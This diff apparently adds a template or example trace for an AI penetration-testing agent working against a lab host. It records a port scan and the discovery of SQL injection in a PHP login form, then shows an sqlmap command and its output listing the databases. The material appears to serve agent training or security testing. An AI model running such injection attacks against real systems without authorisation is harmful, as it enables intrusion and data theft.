@@ -1,0 +1,29 @@
+[Task: Exploit the web application on 10.10.10.5]
+ 
+# Whiteboard Index
+
+## target_services
+**Description**: 10.10.10.5 exposes SSH on 22 and HTTP on 8080.
+### Content
+Ran full TCP scan. Result: 22/tcp open ssh, 8080/tcp open http-proxy.
+
+## web_recon
+
+**Description**: Login form at /login, parameter 'username', stack is PHP/MySQL.
+### Content
+Navigated to http://10.10.10.5:8080. Found /login via directory brute-force. Form \
+submits POST to /login with fields username and password. Server header: Apache/2.4.51 \
+(PHP/7.4). Error page leaks MySQL syntax error on single-quote injection in username field.
+ 
+Tool: {ThinkTool.name}
+Input: The whiteboard already has service and recon findings. I do not need to re-scan. \
+web_recon confirms error-based MySQL disclosure on the username field, that is a SQL injection \
+surface. I can proceed directly to exploitation using what is already recorded.
+Output: (no observation)
+ 
+Tool: <terminal>
+Input: sqlmap -u "http://10.10.10.5:8080/login" --data="username=*&password=x" --technique=E --dbs --batch
+Output:
+available databases:
+[*] information_schema
+[*] appdb
